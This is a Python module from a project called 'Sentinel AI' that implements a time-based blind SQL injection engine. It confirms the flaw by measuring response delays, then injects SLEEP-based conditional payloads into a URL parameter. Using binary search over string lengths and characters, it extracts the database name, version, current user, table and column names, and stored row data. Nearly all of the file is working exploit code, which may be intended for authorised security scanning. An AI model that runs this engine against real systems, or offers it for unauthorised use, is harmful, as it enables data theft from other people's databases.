"""
===========================================================
Project : Sentinel AI
Module  : Blind Time SQL Injection
File ID : SCANNER-BLIND-TIME-001
Version : 1.1.0
===========================================================

Description:
Time-Based Blind SQL Injection engine.
Detects and exploits Time-Based Blind SQLi vulnerabilities.
"""

from __future__ import annotations

import logging
import statistics
import time

from app.modules.scanner.core.base_scanner import BaseScanner
from app.modules.scanner.modules.blind_payloads import BlindPayloadGenerator

logger = logging.getLogger(__name__)


class BlindTimeScanner(BaseScanner):
    """
    Time-Based Blind SQL Injection scanner.
    """

    def __init__(self, target: str):
        super().__init__(target)
        self.payload_gen = BlindPayloadGenerator()
        self.dbms: str | None = None
        self.parameter: str = "category"
        self.baseline_time: float = 0.0
        self.baseline_std: float = 0.1
        self.delay_threshold: float = 5.0
        self.is_time_vulnerable: bool = False
        self.detected_payload: str | None = None
        self.max_retries: int = 3
        self.retry_delay: float = 1.0
        self.baseline_samples: int = 5

        self.statistics = {
            "requests": 0,
            "successful": 0,
            "failed": 0,
            "characters_extracted": 0,
        }

    def detect(self) -> bool:
        """
        Detect if Time-Based Blind SQL injection is possible.

        Returns:
            True if vulnerable, False otherwise
        """
        logger.info("[BlindTime] Detecting Time-Based Blind SQLi...")

        # Step 1: Get baseline response time (multiple samples for stability)
        baseline_measurements = []
        for i in range(self.baseline_samples):
            measurement = self._measure_response_time_with_retry("")
            if measurement > 0:
                baseline_measurements.append(measurement)
            time.sleep(0.5)

        if len(baseline_measurements) < 3:
            logger.info("[BlindTime] ❌ Insufficient baseline measurements")
            return False

        self.baseline_time = statistics.mean(baseline_measurements)
        self.baseline_std = (
            statistics.stdev(baseline_measurements)
            if len(baseline_measurements) > 1
            else 0.1
        )

        logger.info(
            f"[BlindTime]   Baseline time: {self.baseline_time:.3f}s (std: {self.baseline_std:.3f}s)"
        )

        # Step 2: Test time payloads (multiple attempts for reliability)
        for payload in self.payload_gen.get_time_detection_payloads():
            # Test each payload multiple times
            delays = []
            for attempt in range(3):
                sleep_time = self._measure_response_time_with_retry(payload)
                if sleep_time > 0:
                    delay = sleep_time - self.baseline_time
                    delays.append(delay)
                time.sleep(1)

            if not delays:
                continue

            avg_delay = statistics.mean(delays)

            # Adaptive threshold: 3 standard deviations or minimum 3 seconds
            threshold = max(3.0, self.baseline_std * 3)

            if avg_delay > threshold:
                self.is_time_vulnerable = True
                self.detected_payload = payload
                logger.info(
                    f"[BlindTime] ✅ Time-Based Blind SQLi confirmed (avg delay: {avg_delay:.3f}s)"
                )
                logger.info(f"[BlindTime]   Payload: {payload}")
                return True

        logger.info("[BlindTime] ❌ Time-Based Blind SQLi not detected")
        return False

    def extract_database(self) -> str | None:
        """Extract database name using Time-Based Blind SQLi."""
        if not self.is_time_vulnerable:
            return None

        logger.info("[BlindTime] Extracting database name...")
        query = self.payload_gen.get_time_database_query()
        result = self._extract_string(query)
        if result:
            logger.info(f"[BlindTime] ✅ Database: {result}")
        return result

    def extract_version(self) -> str | None:
        """Extract database version using Time-Based Blind SQLi."""
        if not self.is_time_vulnerable:
            return None

        logger.info("[BlindTime] Extracting database version...")
        query = self.payload_gen.get_time_version_query()
        result = self._extract_string(query)
        if result:
            logger.info(f"[BlindTime] ✅ Version: {result}")
        return result

    def extract_user(self) -> str | None:
        """Extract current user using Time-Based Blind SQLi."""
        if not self.is_time_vulnerable:
            return None

        logger.info("[BlindTime] Extracting current user...")
        query = self.payload_gen.get_time_user_query()
        result = self._extract_string(query)
        if result:
            logger.info(f"[BlindTime] ✅ User: {result}")
        return result

    def extract_tables(self) -> list[str]:
        """Extract table names using Time-Based Blind SQLi."""
        if not self.is_time_vulnerable:
            return []

        logger.info("[BlindTime] Extracting tables...")
        tables = []

        for i in range(20):
            query = self.payload_gen.get_time_tables_query(i)
            table_name = self._extract_string(query)
            if table_name:
                tables.append(table_name)
                logger.info(f"[BlindTime]   Table {i + 1}: {table_name}")
            else:
                break

        return tables

    def extract_columns(self, table: str) -> list[str]:
        """Extract column names from a table using Time-Based Blind SQLi."""
        if not self.is_time_vulnerable:
            return []

        logger.info(f"[BlindTime] Extracting columns from {table}...")
        columns = []

        for i in range(20):
            query = self.payload_gen.get_time_columns_query(table, i)
            column_name = self._extract_string(query)
            if column_name:
                columns.append(column_name)
                logger.info(f"[BlindTime]   Column {i + 1}: {column_name}")
            else:
                break

        return columns

    def extract_data(self, table: str, column: str, limit: int = 20) -> list[str]:
        """Extract data from a table using Time-Based Blind SQLi."""
        if not self.is_time_vulnerable:
            return []

        logger.info(f"[BlindTime] Extracting data from {table}.{column}...")
        data = []

        for i in range(limit):
            query = self.payload_gen.get_time_data_query(column, table, i)
            value = self._extract_string(query)
            if value:
                data.append(value)
                logger.info(f"[BlindTime]   Row {i + 1}: {value}")
            else:
                break

        return data

    def _measure_response_time(self, payload: str) -> float:
        """Measure response time for a payload."""
        self.statistics["requests"] += 1

        try:
            start = time.perf_counter()

            if "?" in self.target:
                base_url = self.target.split("?")[0]
                existing_params = (
                    self.target.split("?")[1] if "?" in self.target else ""
                )
                if existing_params:
                    url = f"{base_url}?{existing_params}&{self.parameter}={payload}"
                else:
                    url = f"{base_url}?{self.parameter}={payload}"
            else:
                url = f"{self.target}?{self.parameter}={payload}"

            response = self.request.send(
                method="GET",
                url=url,
            )

            elapsed = time.perf_counter() - start

            if response:
                self.statistics["successful"] += 1
            else:
                self.statistics["failed"] += 1

            return elapsed

        except Exception as e:
            self.statistics["failed"] += 1
            logger.debug(f"[BlindTime] Request failed: {e}")
            return 0.0

    def _measure_response_time_with_retry(self, payload: str) -> float:
        """Measure response time with retry logic."""
        for attempt in range(self.max_retries):
            elapsed = self._measure_response_time(payload)
            if elapsed > 0:
                return elapsed
            if attempt < self.max_retries - 1:
                time.sleep(self.retry_delay * (attempt + 1))
        return 0.0

    def _extract_string(self, query: str) -> str | None:
        """Extract a string using Time-Based Blind SQLi."""
        if not self.detected_payload:
            return None

        result = ""
        length = 0

        # Determine length using binary search
        max_len = 256
        min_len = 1

        while min_len <= max_len:
            mid = (min_len + max_len) // 2
            test_query = f"LENGTH(({query})) > {mid}"
            payload = self._build_time_payload(test_query)

            if self._check_time_delay(payload):
                min_len = mid + 1
                length = mid
            else:
                max_len = mid - 1

        logger.debug(f"[BlindTime]   String length: {length}")

        if length == 0:
            return ""

        for pos in range(1, length + 1):
            char = self._extract_char_at_position(query, pos)
            if char:
                result += char
                self.statistics["characters_extracted"] += 1

                if len(result) % 5 == 0:
                    logger.info(f"[BlindTime]   Extracted: {result}")

        return result

    def _extract_char_at_position(self, query: str, position: int) -> str | None:
        """Extract a character at a position using binary search."""
        low = 32
        high = 126

        while low <= high:
            mid = (low + high) // 2
            test_query = f"ASCII(SUBSTRING(({query}), {position}, 1)) > {mid}"
            payload = self._build_time_payload(test_query)

            if self._check_time_delay(payload):
                low = mid + 1
            else:
                high = mid - 1

        if low <= 126:
            return chr(low)

        return None

    def _build_time_payload(self, condition: str) -> str:
        """Build a time-based payload with a condition."""
        # Simplified - actual implementation depends on DBMS
        return f"' AND IF({condition}, SLEEP(5), 0)-- -"

    def _check_time_delay(self, payload: str) -> bool:
        """Check if payload causes a time delay."""
        # Test multiple times for reliability
        delays = []
        for _ in range(2):
            response_time = self._measure_response_time_with_retry(payload)
            if response_time > 0:
                delay = response_time - self.baseline_time
                delays.append(delay)
            time.sleep(0.5)

        if not delays:
            return False

        avg_delay = statistics.mean(delays)
        threshold = max(3.0, self.baseline_std * 3)

        return avg_delay > threshold
